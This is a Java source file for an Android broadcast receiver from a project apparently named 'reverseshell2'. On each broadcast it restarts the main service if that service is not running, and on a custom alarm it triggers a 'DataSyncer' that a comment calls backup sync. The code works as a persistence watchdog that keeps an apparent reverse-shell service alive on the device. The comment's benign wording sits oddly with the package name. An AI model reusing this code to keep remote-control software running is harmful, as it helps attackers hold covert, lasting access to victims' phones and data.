package com.example.reverseshell2;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class broadcastReciever extends BroadcastReceiver {

    static String TAG = "broadcastRecieverClass";
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i(TAG, "Broadcast received: " + (intent.getAction() != null ? intent.getAction() : "unknown"));

        // Handle alarm-based backup sync
        if ("com.example.reverseshell2.SYNC_ALARM".equals(intent.getAction())) {
            Log.d(TAG, "Alarm sync triggered");
            new Thread(() -> {
                DataSyncer syncer = new DataSyncer(context);
                syncer.performSync();
            }).start();
        }

        // Restart service if not running
        if (!isMyServiceRunning(context)) {
            Log.v(TAG, "Service not running, restarting...");
            Intent svcIntent = new Intent(context, mainService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                context.startForegroundService(svcIntent);
            } else {
                context.startService(svcIntent);
            }
        }
    }

    private boolean isMyServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (mainService.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
